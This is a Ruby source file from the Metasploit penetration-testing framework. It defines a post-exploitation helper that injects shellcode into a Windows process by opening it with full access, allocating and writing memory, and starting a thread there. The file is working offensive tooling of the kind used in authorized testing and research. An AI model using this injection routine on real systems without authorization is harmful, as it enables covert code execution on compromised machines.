# -*- coding: binary -*-

module Msf
class Post
module Windows

module Process

	#
	# Injects shellcode to a process, and executes it.
	#
	# @param shellcode [String] The shellcode to execute
	# @param base_addr [Fixnum] The base address to allocate memory
	# @param pid       [Fixnum] The process ID to inject to
	#
	# @return [Boolean] True if successful, otherwise false
	#
	def execute_shellcode(shellcode, base_addr=nil, pid=nil)
		pid ||= session.sys.process.getpid
		host  = session.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)
		if base_addr.nil?
			shell_addr = host.memory.allocate(shellcode.length)
		else
			shell_addr = host.memory.allocate(shellcode.length, nil, base_addr)
		end
		if host.memory.write(shell_addr, shellcode) < shellcode.length
			vprint_error("Failed to write shellcode")
			return false
		end

		vprint_status("Creating the thread to execute in 0x#{shell_addr.to_s(16)} (pid=#{pid.to_s})")
		ret = session.railgun.kernel32.CreateThread(nil, 0, shell_addr, nil, 0, nil)
		if ret['return'] < 1
			vprint_error("Unable to CreateThread")
			return false
		end

		true
	end

end # Process
end # Windows
end # Post
end # Msf
